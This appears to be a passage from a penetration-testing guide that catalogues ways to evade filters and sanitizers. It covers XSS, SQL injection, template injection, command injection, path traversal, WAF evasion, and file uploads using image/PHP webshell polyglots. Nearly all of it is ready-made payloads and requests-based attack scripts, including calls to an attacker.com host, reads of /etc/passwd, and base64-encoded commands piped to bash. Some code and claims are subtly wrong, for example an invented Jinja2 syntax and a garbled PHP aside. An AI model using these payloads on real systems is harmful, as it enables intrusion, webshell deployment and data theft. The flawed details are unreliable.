            '<keygen autofocus onfocus=alert(1)>',
            '<a href="javascript:alert(1)">click</a>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<math><mtext><table><mglyph><svg><mtext><table><mglyph><svg>',
        ],
        'attribute': [
            '" onfocus=alert(1) autofocus="',
            '" onmouseover=alert(1) x="',
            "' onfocus=alert(1) autofocus='",
            "' onmouseover=alert(1) x='",
            ' autofocus onfocus=alert(1) ',
            '"><script>alert(1)</script>',
            '"><svg onload=alert(1)>',
            ' javascript:alert(1)',
            ' data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        ],
        'javascript': [
            '";alert(1);var x="',
            "';alert(1);var x='",
            '${alert(1)}',
            '</script><script>alert(1)</script>',
            '\\";alert(1);//',
            '\\';alert(1);//',
            'constructor.constructor("alert(1)")()',
        ],
        'css': [
            'javascript:alert(1)',
            'url(javascript:alert(1))',
            'expression(alert(1))',
            '</style><script>alert(1)</script>',
        ],
        'url': [
            'javascript:alert(1)',
            'javascript:alert(1);//',
            'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
            'vbscript:alert(1)',
            '//attacker.com/evil.js',
        ],
        'json': [
            '", "x": "',
            '</script><script>alert(1)</script>',
            '\\u0022alert(1)\\u0022',
        ],
        'xml': [
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            ']]><script>alert(1)</script>',
            '<!--><script>alert(1)</script>',
        ],
    }
```

---

## Filter Evasion Catalog

### HTML Tag Blacklist

| Blocked Tag | Bypass Payload |
|-------------|----------------|
| `<script>` | `<ScRiPt>` (case variation) |
| `<script>` | `<scr<script>ipt>` (tag splitting) |
| `<script>` | `<<script>` (partial match fails) |
| `<script>` | `<SCRIPT>` (uppercase) |
| `<script>` | `<svG onload=alert(1)>` (different tag) |
| `<script>` | `<img src=x onerror=alert(1)>` (event handler) |
| `<script>` | `<body onload=alert(1)>` (document event) |
| `<script>` | `<details open ontoggle=alert(1)>` (HTML5) |
| `<script>` | `<input autofocus onfocus=alert(1)>` (form event) |
| `<script>` | `<iframe srcdoc="<script>alert(1)</script>">` (iframe) |
| `<script>` | `<link rel=import href=http://attacker.com/evil>` (import) |
| `<script>` | `<isindex type=image src=x onerror=alert(1)>` (obsolete) |
| `<script>` | `<marquee onstart=alert(1)>` (obsolete) |
| `<script>` | `<math><mtext><table><mglyph><svg>` (math+svg) |

**Unclosed tags:**
```html
<!-- Blocked: <script>alert(1)</script> -->
<!-- Bypass: -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

**Nested tags:**
```html
<!-- Blocked: <script> onerror= -->
<!-- Bypass: -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<sc<script>ript>alert(1)</sc</script>ript>
```

### Script Tag Filter

| Filter | Bypass |
|--------|--------|
| Block `<script>` exactly | Use `<ScRiPt>`, `<SCRIPT>`, `<sCrIpT>` |
| Case-insensitive script | Use event handlers: `<img src=x onerror=>` |
| Block all `on*` events | Use `onfocus=`, `onmouseover=`, `onload=`, `onerror=` — if all blocked, try different vector |
| Block all `<` and `>` | Use `javascript:` URLs in attributes (`<a href="javascript:alert(1)">`) |
| Block HTML tags entirely | Use CSS injection: `background:url(javascript:alert(1))` |
| Remove tags | Use tag splitting: `<scr<script>ipt>` → after removal: `<script>` |
| Strip specific patterns | Use `<<tag>` pattern: `<<script>` stripped to `<script>` |

**Event handler bypasses when `<script>` is blocked:**

```html
<!-- Window events -->
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onafterprint=alert(1)>

<!-- Form events -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>

<!-- Mouse events -->
<img src=x onerror=alert(1)>
<img src=x onmouseover=alert(1)>

<!-- HTML5 events -->
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<embed src=x onerror=alert(1)>
<object data=x onerror=alert(1)>

<!-- SVG events -->
<svg onload=alert(1)>
<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg">
<svg><animatetransform onbegin=alert(1)>
<svg><animatetransform onrepeat=alert(1)>

<!-- Iframe events -->
<iframe onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

### Keyword Blacklist

| Blacklisted Keyword | Bypass |
|---------------------|--------|
| `alert` | `prompt(1)`, `confirm(1)`, `console.log(1)` |
| `alert` | `al\u0065rt(1)` (unicode escape in JS) |
| `alert` | `eval('ale'+'rt(1)')` (string concatenation) |
| `alert` | `window['alert'](1)` (bracket notation) |
| `alert` | `atob('YWxlcnQoMSk=')` (base64 encode) |
| `script` | `%73%63%72%69%70%74` (URL encoding) |
| `script` | `&#115;&#99;&#114;&#105;&#112;&#116;` (HTML entities) |
| `script` | `sel<script>ect` (tag splitting) |
| `script` | `scr\0ipt` (null byte) |
| `onerror` | `onError`, `ONERROR`, `Onerror` (case) |
| `onerror` | `on-\0error` (null byte) |
| `javascript` | `java\nscript` (newline) |
| `javascript` | `java\tscript` (tab) |
| `javascript` | `JaVaScRiPt` (case) |
| `javascript` | `%6aava%73cript` (partial encoding) |
| `cookie` | `document.cookie` → `document['cookie']` |
| `cookie` | `doc\u0063ument.cookie` |

**HTML entity encoding bypass:**

```html
<!-- If the filter decodes entities before checking: -->
<!-- Send: &lt;img src=x onerror=alert(1)&gt; -->
<!-- Filter decodes: <img src=x onerror=alert(1)> → blocked! -->

<!-- But what about double-encoding? -->
<!-- Send: &amp;lt;img src=x onerror=alert(1)&amp;gt; -->
<!-- Filter decodes once: &lt;img src=x onerror=alert(1)&gt; → passes -->
<!-- Browser decodes again: <img src=x onerror=alert(1)> → XSS -->
```

**Comment splitting:**

```html
<!-- Filter removes <script> and </script> -->
<!-- Payload: <scr<script>ipt>alert(1)</scr</script>ipt> -->
<!-- After filter removes <script>: <script>alert(1)</script> -->
```

### Regex Filter

| Regex Pattern | Vulnerability | Bypass |
|---------------|---------------|--------|
| `/<[^>]+>/g` | Strips all tags | `<<tag>text` — removes `<>` leaves `tag>text` |
| `/<script>.*<\/script>/i` | Greedy match | `<script>a<script>alert(1)</script>` — first close matches |
| `/<script>.*?<\/script>/i` | Non-greedy | `<!–<script>–><script>alert(1)</script>` — comment bypass |
| `/<[^>]+>/gi` | Case-insensitive tags | `\x3Cimg src=x onerror=alert(1)\x3E` — unicode |
| `/<[a-z]+[^>]*>/gi` | Character class | `<img/src=x onerror=alert(1)>` — `/` before attribute |
| `/(alert\|prompt\|confirm)/i` | Keyword list | `(1,alert)(1)` — comma operator |
| `/(script\|onerror)/i` | OR pattern | `onerror` in attribute context, `<SCRIPT>` |
| `/\bscript\b/i` | Word boundary | `<script>` _is_ a word, but `<scripting>` not caught |
| `/^[a-z]+$/i` | Full string | `\x00` null byte truncation, `a%00<script>` |

**ReDoS (Regular Expression Denial of Service):**

```python
# Vulnerable regex
evil_regex = re.compile(r'^(\w+)+$')

# ReDoS payload: 40+ characters of alphanumeric followed by !
payload = 'A' * 40 + '!'
# The regex engine backtracks exponentially trying all combinations
# Server times out processing this request
# Meanwhile, another request with a payload goes through unchecked
```

### Length Restriction

| Restriction Type | Bypass |
|------------------|--------|
| `maxlength=50` (client) | Direct API call skips client limits |
| `VARCHAR(50)` (DB) | Padding to truncation, `WHERE` vs `ORDER` injection |
| Input limited to 100 chars | Chunked injection via multiple parameters |
| File size limit | Chunked transfer encoding |
| Input limited to 20 chars | Multiple fields concatenated in output |

**Chunked attacks:**

```javascript
// If a single field is length-limited:
// Field 1: <img src=x
// Field 2:  onerror=alert(1)>

// If the application concatenates fields:
// <img src=x onerror=alert(1)> → Working XSS

// Batch/multi-part attacks:
// If the application stores multiple values and renders them together:
// Name: <script>
// Bio: alert(1)
// Title: </script>
// Rendered: <script>alert(1)</script> → XSS
```

**Multi-parameter concatenation attacks:**

```python
def test_concat_bypass(endpoint, params):
    """Test if multiple parameters are concatenated unsafely."""
    payload_parts = {
        'first_name': '<scr',
        'last_name': 'ipt>alert(1)</script>',
        'username': 'javascript:',
        'website': 'alert(1)',
        'bio': 'onerror=alert(1)',
        'title': '<img src=x ',
        'subtitle': '/>',
    }
    return requests.post(endpoint, data=payload_parts)
```

### Type Validation

| Expected Type | Bypass Payload | Effect |
|---------------|----------------|--------|
| String: `"hello"` | Array: `["<script>alert(1)</script>"]` | Bypasses string validation, rendered as `<script>alert(1)</script>` |
| String: `"hello"` | Object: `{"key": "value"}` | Bypasses string checks |
| Integer: `123` | Boolean: `true` | `true == 1` in PHP, bypasses numeric checks |
| Integer: `123` | Float: `1.23` | May bypass integer validation |
| Float: `1.5` | String: `"1.5e10"` | Parsed as float differently |
| Email: `a@b.com` | `a@b.com<script>` | Length extension |
| URL: `http://x.com` | `javascript:alert(1)` | Protocol bypass |
| Array: `[1,2,3]` | `{"0": 1, "1": 2}` | Object masquerading as array |
| `null` | `""` (empty string) | Different falsey handling |

**Type confusion in PHP:**

```php
// strpos returns false if needle not found
if (strpos($input, '<script>') !== false) {
    die('blocked');
}
// But if strpos returns 0 (needle at position 0), the !== check is correct
// What about other falsey values?
// Input: []  → strpos([], '<script>') → NULL, but NULL !== false is... NULL !== false is true
// Wait, NULL !== false is true in PHP. So [] would pass.
// But [] when echoed becomes "Array" in PHP — not useful for XSS but useful for type juggling.

// Type juggling in validation:
$valid = $input == "safe";  // Loose comparison
// "safe" == true → true (any non-empty string is truthy)
// 0 == "safe" → false in PHP 8, but was true in older versions
// [] == "safe" → false
```

**Type confusion in JavaScript:**

```javascript
// Loose comparison bypasses
if (input != "") {  // Loose comparison
    sanitize(input);
}
// Input: 0 → 0 != "" → false (0 == "" is true in JS)
// Input: [] → [] != "" → false ([] == "" is true in JS)
// Input: false → false != "" → false (false == "" is true)
// Input: null → null != "" → false (null == "" is false, but null != "" is true)

// typeof bypass
if (typeof input === 'string' && input.length > 0) {
    sanitize(input);
}
// Input: [] → typeof [] is 'object' → bypasses
// Input: 123 → typeof 123 is 'number' → bypasses
// Input: {toString: ()=>'<script>alert(1)</script>'} → typeof is 'object' → bypasses
```

### Magic Byte Checking

Some applications check file magic bytes (file signatures) before processing:

| Expected Format | Magic Bytes | Bypass |
|----------------|-------------|--------|
| JPEG | `FF D8 FF E0` | `FF D8 FF E0 + PHP webshell` |
| PNG | `89 50 4E 47` | `89 50 4E 47 + <script>alert(1)</script>` |
| GIF | `47 49 46 38` | `47 49 46 38 + <?php system($_GET['cmd']); ?>` |
| PDF | `25 50 44 46` | `25 50 44 46 + <script>alert(1)</script>` |
| ZIP | `50 4B 03 04` | `50 4B 03 04 + PHP file inside zip` |
| XML | `3C 3F 78 6D` (`<?xm`) | Already flexible |

**Generate a polyglot file:**

```python
def create_gif_polyglot(php_code):
    """Create a GIF that also contains PHP code."""
    return (
        b'GIF89a'  # GIF header (passes magic byte check)
        b'\x01\x00\x01\x00'  # Width x height
        b'\x00'  # Packed field
        b'\x00'  # Background color
        b'\x00'  # Pixel aspect ratio
        + b'<?php ' + php_code.encode() + b' ?>'  # PHP payload
        b'\x00\x3B'  # GIF trailer
    )
```

**BOM (Byte Order Mark) injection:**

```python
# BOM bypass for file upload filters
# Some parsers ignore BOM, some don't
bom = b'\xEF\xBB\xBF'  # UTF-8 BOM
payload = b'<script>alert(1)</script>'

# If the filter checks for HTML tags but doesn't strip BOM:
# BOM + <script> may not be detected by regex that expects ASCII < at position 0
```

### File Extension Filter

| Filter | Bypass |
|--------|--------|
| Block `.php` | `.php5`, `.phtml`, `.php7`, `.shtml`, `.inc` |
| Block `.jsp` | `.jspx`, `.jsw`, `.jsv`, `.jspf` |
| Block `.asp` | `.aspx`, `.asa`, `.cer`, `.cdx` |
| Block `.exe` | `.exe ` (trailing space), `.exe.` (trailing dot) |
| Allow only `.jpg` | `.php.jpg` (double extension), `.php\x00.jpg` (null byte) |
| Allow only `.jpg` | `.jpg/.php` (path truncation on some systems) |
| Allow only `.jpg` | `.JPG`, `.Jpg`, `.jPg` (case variation) |
| Allow only `.jpg` | `.htaccess` upload → `AddType application/x-httpd-php .jpg` |
| Check extension only at end | `file.php;.jpg` |
| Check extension only at start | `file.jpg.php` |
| Blacklist `.php` | `.php.jpg` (if server checks last extension only) |
| Strip `.php` | `.pphphp` (after strip: `.php`) |
| Block `/` in path | `..\` (backslash on Windows servers) |
| Check extension of filename | `filename=shell.php&filename=image.jpg` (parameter pollution) |

**Null byte bypass:**

```bash
# Classic null byte (PHP < 5.3.4)
shell.php%00.jpg
# The file is saved as shell.php (null byte truncates the filename)

# Unicode null byte
shell.php%00%2Ejpg
shell.php\u0000.jpg
```

**Double extension bypass:**

```
shell.php.jpg          # If server checks last extension only
shell.php;jpg          # Some servers ignore everything after ;
shell.php..jpg         # Some servers handle .. as directory separator
shell.php .jpg         # Some servers handle spaces as extension separator
shell.php%00.jpg       # Null byte truncation
shell.php.\x00.jpg     # Another null byte variant
```

**.htaccess upload to enable execution:**

```apache
# Upload this as .htaccess:
AddType application/x-httpd-php .jpg
AddHandler php5-script .jpg

# Then upload shell.jpg containing PHP code
# The server executes shell.jpg as PHP
```

### Image Validation

| Validation | Bypass |
|------------|--------|
| Check file extension | Polyglot GIF/JPEG/PNG with embedded code |
| Check magic bytes | Prepend magic bytes to any payload |
| Use PHP `getimagesize()` | Create valid image with EXIF comment payload |
| Use GD/ImageMagick | Create valid image with metadata payload |
| Re-encode image | Some image libraries preserve EXIF/IPTC data |
| Resize/crop image | Metadata in comments may persist |
| Strip EXIF data | Only some libraries strip all metadata |

**JPEG + PHP polyglot generation:**

```python
def create_jpeg_php_polyglot(php_payload, output_file):
    """Create a valid JPEG that also executes PHP when accessed."""
    white_pixel = (
        b'\xff\xd8\xff\xe0'  # JPEG SOI + APP0 marker
        b'\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
        b'\xff\xdb\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07'
        b'\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f'
        b'\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.\' ",#\x1c\x1c(7),'
        b'044\x13(97,=??<;\x10\x83\x82\x98\x90\x8f\x96\x86\x93\x8f'
        b'\xbb\xb1\x8b\x99\xa9\xb7\xbe\xb6\xf0\xf1\xdb\xda\xfe\xff'
        b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
        b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01'
        b'\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07'
        b'\x08\t\n\x0b\xff\xc4\x00\xb5\x10\x00\x02\x01\x03\x03\x02'
        b'\x04\x03\x05\x05\x04\x04\x00\x00\x00\x00\x01\x02\x03\x11'
        b'\x04\x05!1\x06\x12AQ\x16\x07a\x13q\x15\x142Sb\x08"\x81'
        b'\x91\xa1\t#B\xc1\x17\xd1\xe1\xff\xda\x00\x08\x01\x01\x00'
        b'\x00?\x00\xf9\xd8\xae\x01\xd0\x10\x12\xa6\x95\xb8\x9f\xd8'
        b'\xbb\xa1;\xa0)\xce\xe6A\x8c\x12\x88\xde\x05\x04\x08\x1f'
        b'\xf0\xa6\x1a\xf9\xd2\x86\xef\x04y\x97\xb6\x8b\xfe\xe2'
        b'\xff\xd9'
    )

    # Insert PHP payload after EOI in APP1 comment
    payload = white_pixel + b'<?php ' + php_payload.encode() + b' ?>'

    with open(output_file, 'wb') as f:
        f.write(payload)

    return output_file

# Usage: create_jpeg_php_polyglot('system($_GET["cmd"]);', 'shell.jpg')
```

### MIME Type Check

| Expected MIME | Bypass |
|---------------|--------|
| `image/jpeg` | `Content-Type: image/jpeg` but body is PHP webshell |
| `text/plain` | `Content-Type: text/plain` with `<script>` in body |
| `application/pdf` | `Content-Type: application/pdf` with XSS payload |
| `image/png` | `Content-Type: image/png; name=shell.php` (header injection) |
| Multipart boundary | Nest file in boundary that matches expected type |

**Content-Type manipulation:**

```python
def test_content_type_bypass(url):
    """Test if server validates Content-Type but not actual content."""
    payload = b'<?php system($_GET["cmd"]); ?>'

    # All these should be rejected if MIME check is real:
    types = [
        'image/jpeg',
        'image/png',
        'image/gif',
        'application/pdf',
        'text/plain',
        'application/octet-stream',
        'multipart/form-data; boundary=----WebKitFormBoundary',
    ]

    for ct in types:
        files = {'file': ('shell.php', payload, ct)}
        r = requests.post(url, files=files)
        print(f"{ct}: {r.status_code} - {r.text[:100]}")
```

**Multipart boundary tricks:**

```http
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

---

## Sanitization Bypass by Vulnerability Class

### XSS Filter Bypass

#### CSP Eval Bypass

If CSP allows `'unsafe-eval'`:

```javascript
// CSP: script-src 'self' 'unsafe-eval'
// Standard injection won't work because 'self' blocks external scripts
// But eval works:

// Injected into page:
eval('alert(1)');

// More elaborate:
eval(String.fromCharCode(97,108,101,114,116,40,49,41));

// setTimeout/setInterval bypass:
setTimeout('alert(1)', 0);
setInterval('alert(1)', 0);

// Function constructor:
Function('alert(1)')();

// Dynamic import:
import('data:text/javascript,alert(1)');
```

#### Script Src Whitelist Bypass

If CSP restricts script sources to a specific domain:

```javascript
// CSP: script-src 'self' https://cdnjs.cloudflare.com
// Bypass via Angular libraries hosted on allowed CDN:

// Angular expression sandbox escape (legacy)
https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.7/angular.js
// Payload: {{constructor.constructor('alert(1)')()}}

// Prototype.js (legacy)
https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js
```

#### JSONP Endpoint Abuse

```javascript
// CSP: script-src 'self' https://api.target.com
// If api.target.com has a JSONP endpoint:

<script src="https://api.target.com/user/data?callback=alert(1);"></script>

// Or redirect-based JSONP:
<script src="https://api.target.com/login?redirect=https://attacker.com/evil.js"></script>
```

#### Import Scripts

```javascript
// CSP: script-src 'self' https://cdn.example.com
// If the page imports scripts dynamically:

// Service Worker import (if allowed):
navigator.serviceWorker.register('/sw.js?script=alert(1)');

// Import maps (Chrome):
<script type="importmap">
{
    "imports": {
        "evil": "data:text/javascript,alert(1)"
    }
}
</script>
<script type="module">import 'evil'</script>
```

### SQLi Filter Bypass

#### Comment Sequences

```sql
-- Comment-based bypasses:
' OR 1=1 --
' OR 1=1 #
' OR 1=1 /*
' OR 1=1;%00
' OR '1'='1
' OR 1=1-- -
' OR 1=1--+ (MySQL)
```

#### Operator Substitution

```sql
-- Instead of OR, use AND with negation:
' OR 1=1 --    →  blocked
' AND 1=0 UNION SELECT ... --  →  may bypass

-- Instead of equals, use comparison:
' OR 1=1 --    →  blocked
' OR 1 > 0 --  →  may bypass

-- Instead of OR, use IN:
' OR 1=1 --    →  blocked
' OR 1 IN (1) --  →  may bypass

-- Instead of 1=1, use truthy expressions:
' OR 'a'='a' --  →  blocked
' OR 'a' LIKE 'a' --  →  may bypass
' OR 'a' IN ('a') --  →  may bypass
```

#### Hex Encoding

```sql
-- MySQL accepts hex literals:
' UNION SELECT 1,2,3 --     →  blocked for UNION
' UNION SELECT 0x312c322c33 --  →  hex-encoded "1,2,3"

-- Table/column names as hex:
' UNION SELECT * FROM users --  →  blocked
' UNION SELECT * FROM 0x7573657273 --  →  hex for "users"
```

#### Double Query

```sql
-- Nested queries to bypass keyword filters:
' UNION SELECT password FROM users --  →  blocked 'UNION'
' UNION SELECT (SELECT password FROM users) --  →  different syntax

-- Subquery bypass:
' OR id = (SELECT id FROM users WHERE email LIKE '%admin%') --
```

#### Null Byte

```sql
-- Truncation-based bypass:
' OR 1=1 --     →  blocked
' OR 1=1 LIMIT 1 INTO @a%00   →  truncated at %00

-- MySQL null byte in WHERE:
' OR 1=1%00'    →  MySQL ignores everything after %00
```

#### Backtick Escaping

```sql
-- MySQL backtick for identifiers:
' UNION SELECT `password` FROM `users` --

-- Alternative quoting:
' UNION SELECT "password" FROM "users" --  (some databases)
```

#### Case Variation

```sql
-- Case variation for keyword filters:
' union select 1,2,3 --
' UNION select 1,2,3 --
' UnIoN sElEcT 1,2,3 --
```

#### Alternative Comparison Operators

```sql
-- != instead of <>
' OR 1 != 0 --

-- XOR for boolean logic
' OR 1 XOR 0 --

-- NOT IN
' OR 1 NOT IN (0) --

-- IS NOT NULL with subquery
' OR (SELECT 1) IS NOT NULL --

-- EXISTS
' OR EXISTS(SELECT 1) --
```

### SSTI Filter Bypass

#### Alternative Delimiters

```python
# Jinja2 delimiters:
{{ expression }}    # Standard
{% statement %}     # Tag-based
{# comment #}      # Comment

# If {{ is blocked:
{% if True %}{{ 7*7 }}{% endif %}  # Uses if/endif without {{...}}{%...%} nesting
{% print 7*7 %}                     # Jinja2 print statement
{%= 7*7 %}                          # Jinja2 alternative expression

# Twig delimiters:
{{ expression }}
{% statement %}
{# comment #}

# ERB delimiters:
<%= expression %>
<% statement %>
<%# comment %>

# Freemarker:
${expression}
<#assign>
<#list>

# Velocity:
$variable
${expression}
```

#### Expression vs Statement Bypass

```python
# If {{ }} expression syntax is blocked, try statement syntax:

# Blocked: {{ config }}
# Bypass:
{% print config %}          # Jinja2 print statement
{%= config %}               # Jinja2 expression statement
{% for key, value in config.items() %}{{ key }}: {{ value }}{% endfor %}

# Blocked: {{ 7*7 }}
# Bypass:
{% if 7*7 == 49 %}true{% endif %}
```

#### Comment in Template

```python
# Insert template comments to split keywords:
{# comment #}{{ config }}{# comment #}

# Blocked: {{ config.SECRET_KEY }}
# Bypass: {{ config['SECRET_KEY'] }}
# Bypass: {{ config|attr('SECRET_KEY') }}
```

#### Filter Override

```python
# Jinja2 allows filters:
{{ payload|safe }}         # Mark as safe HTML (bypasses auto-escape)
{{ payload|e }}            # Force escape
{{ payload|replace('a','b') }}  # String manipulation

# Blocked: {{ "".__class__ }}
# Bypass with attr filter:
{{ "".__class__ }}        →  blocked (contains __)
{{ ""|attr("__class__") }}  →  bypasses keyword filter on input

# Chain filters for RCE:
{{ ""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")(2)|attr("\x5f\x5fsubclasses\x5f\x5f")() }}
```

### Command Injection Filter Bypass

#### IFS Manipulation

```bash
# If space is blocked, use IFS (Internal Field Separator):
cat<IFS>/etc/passwd
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Tab as separator:
cat%09/etc/passwd

# Brace expansion (no spaces):
{cat,/etc/passwd}
```

#### Wildcard Expansion

```bash
# If specific command names are blocked, use wildcards:
/bin/cat /etc/passwd     →  blocked "cat"
/bin/c?t /etc/passwd     →  wildcard bypass
/*/c?t /etc/passwd       →  even more general

# Reverse binary path:
$(echo /etc/passwd | rev)
# = "cat /etc/passwd" → but shell interprets echo differently
# Better:
$(which {c,a,t})  # OR use parameter expansion
```

#### Environment Variable Substitution

```bash
# Use env vars to construct blocked strings:
# Blocked: cat
$c$at /etc/passwd       →  only if $c and $at are empty strings
${c}${a}${t} /etc/passwd

# Extract from PATH or other env vars:
${PATH:0:1}  # First char of PATH

# Zero-arg substitution:
${0}  # In Bash, ${0} is the shell name (e.g., bash)
```

#### Base64 Encoding

```bash
# Execute base64-encoded command:
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash
# "Y2F0IC9ldGMvcGFzc3dk" = base64("cat /etc/passwd")

# Using Perl/Node/Python for base64:
perl -e 'system(decode_base64("Y2F0IC9ldGMvcGFzc3dk"))'
```

#### Newline Splitting

```bash
# If a single line is filtered, split with newlines:
cmd1%0acmd2               # URL-encoded newline
cmd1\ncmd2                # Literal newline in shell

# If filter checks each line separately:
# Line 1: echo hello
# Line 2: ; cat /etc/passwd  # (but ; is blocked)
# Line 3: &&
# Line 1+2+3 = executed as separate commands
```

### Path Traversal Filter Bypass

#### Double Encoding

```bash
# Single encoded:
../../../etc/passwd    →  blocked
%2e%2e%2f%2e%2e%2fetc/passwd  →  decoded by server → caught

# Double encoded (if server decodes twice):
%252e%252e%252f%252e%252e%252fetc/passwd
# First decode: %2e%2e%2f%2e%2e%2fetc/passwd
# Second decode: ../../../etc/passwd
```

#### Unicode Encoding

```bash
# Overlong UTF-8 encoding of ".":
..%c0%ae..%c0%ae..%c0%aeetc/passwd   # 2-byte overlong
..%e0%40%ae..%e0%40%ae..%e0%40%aeetc/passwd
..%c0%2e..%c0%2e..%c0%2eetc/passwd

# Unicode dot:
%u002e%u002e%u2215etc/passwd  # Various Unicode codepoints
%uff0e%uff0e%u2215etc/passwd  # Fullwidth characters
```

#### Nested Traversal

```bash
# Nested:
....//....//....//etc/passwd
..;/..;/../etc/passwd         # If ; is treated as separator
..%252f..%252f..%252fetc/passwd  # Nested URL encoding

# Redundant traversal:
../../.././../../etc/./passwd
../../../etc/./passwd
../../../etc/.../passwd
```

#### Null Byte

```bash
# Classic null byte truncation:
../../../etc/passwd%00.jpg
../../../etc/passwd%00

# Unicode null byte:
../../../etc/passwd\u0000
../../../etc/passwd%c0%80   # Overlong null byte
```

#### Absolute Path Bypass

```bash
# If relative traversal is blocked, use absolute paths:
/etc/passwd
/var/log/apache/access.log

# If absolute path is also blocked:
file:///etc/passwd
file:/etc/passwd
```

#### Server-Side Encoding Mismatch

```bash
# Windows vs Linux encoding:
..\..\..\windows\win.ini     # Windows backslash
%5c%2e%2e%5c%2e%2e%5c%2e%2e  # Encoded backslash

# OS-specific path separators:
..|..|..|windows\\win.ini    # Alternate streams
```

---

## Multi-Layer Sanitization Testing

### Testing When Multiple Filters Apply

When multiple sanitization layers exist, each layer may have different rules. The bypass must pass through ALL layers:

```
Input → WAF → Server Middleware → Application → Template Engine → Output
```

**Common multi-layer bypass strategies:**

```python
def multi_layer_bypass(payload):
    """Encode payload to pass through multiple inspection layers."""
    layers = [
        ('waf', waf_encode),
        ('server', server_encode),
        ('app', app_encode),
    ]

    encoded = payload
    for layer_name, encoder in layers:
        encoded = encoder(encoded)
        print(f"  After {layer_name}: {encoded[:50]}")

    return encoded

# Example: Double-URL-encoded JS with HTML entity wrapping
# Layer 1 (WAF): Checks for <script> → \u0022 is not <script>
# Layer 2 (Middleware): URL-decodes
# Layer 3 (Application): HTML-entity-decodes → <script>alert(1)</script>
# Layer 4 (Template): Auto-escapes → &lt;script&gt; (SAFE)
# But if auto-escape is disabled per field:
# Layer 4 (Template): No escape → <script>alert(1)</script> (XSS!)
```

### Sequential Encoding Layers

Some applications apply multiple encoding rounds:

```python
def test_sequential_encoding(endpoint, field):
    """Test multiple encoding layers against a parameter."""
    payloads = [
        # No encoding
        '<script>alert(1)</script>',

        # Single URL encode
        '%3Cscript%3Ealert(1)%3C%2Fscript%3E',

        # Double URL encode
        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',

        # Triple URL encode
        '%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E',

        # HTML entities
        '&#60;script&#62;alert(1)&#60;/script&#62;',

        # URL-encoded HTML entities
        '%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B/script%26%2362%3B',

        # Unicode escapes
        '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E',

        # Mixed encoding
        '&#60;script%3Ealert(1)%3C/script&#62;',

        # Base64 inside encoding
        base64.b64encode(b'<script>alert(1)</script>').decode(),
    ]

    results = []
    for payload in payloads:
        r = requests.post(endpoint, json={field: payload})
        stored = get_stored_value(endpoint, field)  # Fetch stored value
        rendered = get_rendered_output(endpoint)     # Fetch rendered page

        results.append({
            'payload': payload[:30],
            'stored': stored[:50] if stored else 'N/A',
            'rendered': '<script>' in rendered if rendered else 'N/A',
            'status': r.status_code,
        })

    return results
```

### Request Pre-Processing by CDN/WAF

WAFs and CDNs have their own encoding and decoding rules:

```python
# WAF bypass techniques:
def waf_bypass(payload):
    """Generate WAF bypass variants of a payload."""
    bypasses = [
        # Parameter pollution
        payload,
        param_pollution(payload),

        # Case mixing
        payload.swapcase(),
        payload.lower().capitalize(),

        # Encoding edge cases
        url_encode(payload, safe=''),
        url_encode(url_encode(payload, safe=''), safe=''),

        # Header fragmentation
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{payload}\"",

        # Chunked transfer encoding
        chunked_payload(payload),

        # Request smuggling
        smuggled_payload(payload),

        # Large payload to trigger WAF timeout
        'A' * 10000 + payload,
    ]
    return bypasses

# AWS WAF specific:
# AWS WAF has a 8KB body inspection limit
# Payload after 8KB is not inspected!
```

### Database vs Application Level Filtering Differences

Applications and databases often interpret data differently:

```python
def test_db_vs_app_encoding(endpoint):
    """Test encoding differences between app and database layers."""
    test_cases = [
        # App sees: valid string
        # DB sees: SQL injection
        ("\\' OR '1'='1", "App escape vs DB escape mismatch"),

        # App validates: text ends at null
        # DB stores: full string after null
        ("safe\x00' OR '1'='1", "Null byte truncation difference"),

        # App in UTF-8: checks < and > as 3-byte sequences
        # DB in GBK: interprets bytes differently
        ("%bf%27", "Multi-byte character bypass"),

        # App decodes URL once, DB engine decodes again
        ("%253Cscript%253E", "Double URL decode"),

        # App checks for ' characters
        # DB uses ESCAPE syntax
        ("\\' OR 1=1 --", "Backslash escape confusion"),
    ]

    for payload, description in test_cases:
        r = requests.post(f"{endpoint}/search", data={'q': payload})
        print(f"Test: {description}")
        print(f"  Payload: {payload[:50]}")
        print(f"  Response: {r.status_code} - SQL error: {'error' in r.text.lower() or 'syntax' in r.text.lower()}")
